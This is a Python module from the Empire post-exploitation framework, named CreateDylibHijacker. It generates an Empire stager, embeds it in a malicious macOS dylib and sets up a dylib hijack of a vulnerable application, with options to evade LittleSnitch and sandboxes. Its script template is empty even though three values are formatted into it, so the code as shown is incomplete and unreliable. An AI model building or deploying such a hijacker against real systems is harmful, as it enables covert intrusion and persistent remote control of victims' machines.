from builtins import object
import base64
class Module(object):

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'CreateDylibHijacker',

            # list of one or more authors for the module
            'Author': ['@patrickwardle,@xorrior'],

            # more verbose multi-line description of the module
            'Description': ('Configures and Empire dylib for use in a Dylib hijack, given the path to a legitimate dylib of a vulnerable application. The architecture of the dylib must match the target application. The configured dylib will be copied local to the hijackerPath'),

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : "",

            'NeedsAdmin' : True,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': [
                'comment',
                'https://www.virusbulletin.com/virusbulletin/2015/03/dylib-hijacking-os-x'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Arch' : {
                'Description'   :   'Arch: x86/x64',
                'Required'      :   True,
                'Value'         :   'x86'
            },
            'SafeChecks' : {
                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'LegitimateDylibPath' : {
                'Description'   :   'Full path to the legitimate dylib of the vulnerable application',
                'Required'      :   True,
                'Value'         :   ''
            },
            'VulnerableRPATH' : {
                'Description'   :   'Full path to where the hijacker should be planted. This will be the RPATH in the Hijack Scanner module.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        # the Python script itself, with the command to invoke
        #   for execution appended to the end. Scripts should output
        #   everything to the pipeline for proper parsing.
        #
        # the script should be stripped of comments, with a link to any
        #   original reference script included in the comments.
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        safeChecks = self.options['SafeChecks']['Value']
        arch = self.options['Arch']['Value']
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', userAgent=userAgent, safeChecks=safeChecks)
        launcher = launcher.strip('echo').strip(' | python3 &').strip("\"")
        dylibBytes = self.mainMenu.stagers.generate_dylib(launcherCode=launcher, arch=arch, hijacker='true')
        encodedDylib = base64.b64encode(dylibBytes)
        dylib = self.options['LegitimateDylibPath']['Value']
        vrpath = self.options['VulnerableRPATH']['Value']

        script = """

""" % (dylib,vrpath,encodedDylib)

        return script
